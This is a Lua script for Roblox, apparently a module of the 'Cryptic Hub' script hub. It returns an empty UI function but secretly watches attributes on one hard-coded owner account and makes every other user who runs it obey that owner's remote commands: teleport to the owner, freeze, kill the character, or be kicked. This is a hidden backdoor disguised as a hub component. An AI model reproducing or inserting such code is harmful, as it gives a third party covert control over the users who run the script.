-- [[ Cryptic Hub - jj.lua (Attribute Receiver) ]]
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local OWNER_ID = 3875086037
if LocalPlayer.UserId == OWNER_ID then return function() end end

local isFrozen = false
local freezeCFrame = nil
local lastExecutedTime = 0

-- تجميد الحركة لو تم تفعيل الأمر
RunService.Heartbeat:Connect(function()
    if isFrozen then
        pcall(function()
            local char = LocalPlayer.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hrp then
                    if not freezeCFrame then freezeCFrame = hrp.CFrame end
                    hrp.CFrame = freezeCFrame
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                end
                if hum then hum.PlatformStand = true end
            end
        end)
    else
        freezeCFrame = nil
        pcall(function()
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum.PlatformStand = false end
        end)
    end
end)

-- مراقبة صامتة وسريعة لسمات شخصية المالك في السيرفر
task.spawn(function()
    while true do
        task.wait(0.3) -- فحص فائق السرعة وخفيف جداً
        pcall(function()
            local owner = Players:GetPlayerByUserId(OWNER_ID)
            if owner and owner.Character then
                local cmd = owner.Character:GetAttribute("CrypticCmd")
                local cmdTime = owner.Character:GetAttribute("CrypticTime") or 0
                
                -- التأكد من أن الأمر جديد ولم يتم تنفيذه مسبقاً
                if cmd and cmd ~= "NONE" and cmdTime > lastExecutedTime then
                    lastExecutedTime = cmdTime
                    
                    -- تنفيذ الأمر فوراً
                    if cmd == "COME" then
                        local ownerHRP = owner.Character:FindFirstChild("HumanoidRootPart")
                        local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if ownerHRP and myHRP then
                            myHRP.CFrame = ownerHRP.CFrame + Vector3.new(3, 0, 3)
                        end
                    elseif cmd == "FREEZE" then
                        isFrozen = not isFrozen
                    elseif cmd == "KILL" then
                        local myHum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                        if myHum then myHum.Health = 0 end
                    elseif cmd == "KICK" then
                        LocalPlayer:Kick("Kicked by Owner")
                    end
                end
            end
        end)
    end
end)

return function(tab, UI) end
